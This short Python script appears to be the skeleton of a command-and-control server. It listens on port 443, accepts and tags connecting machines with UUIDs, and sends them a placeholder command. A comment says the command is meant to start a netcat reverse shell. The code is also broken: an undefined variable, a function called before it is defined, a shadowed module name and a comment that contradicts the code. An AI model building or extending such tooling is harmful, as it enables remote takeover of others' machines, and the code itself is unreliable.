import socket
import uuid

host = ''
port = 443


socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((host, port))
socket.listen(max_connections)
clients = []    # Client list
UIDS = {}

try:
	while True:
		client_socket, addr = socket.accept()
		clients.append(client_socket)    # Add client to list on connection

		# Generate random UID for clients to represent them, add it to a dict where UUID is key and IP is value
		for client in clients:
			UIDS[client] = uuid.uuid4()

		i_manage_clients(clients) # Client management command

except KeyboardInterrupt:
	socket.close()

def i_manage_clients(clients):    # Function to manage clients
    for client in clients:
        client.send('Message to pass') # Generate command to start NC reverse shell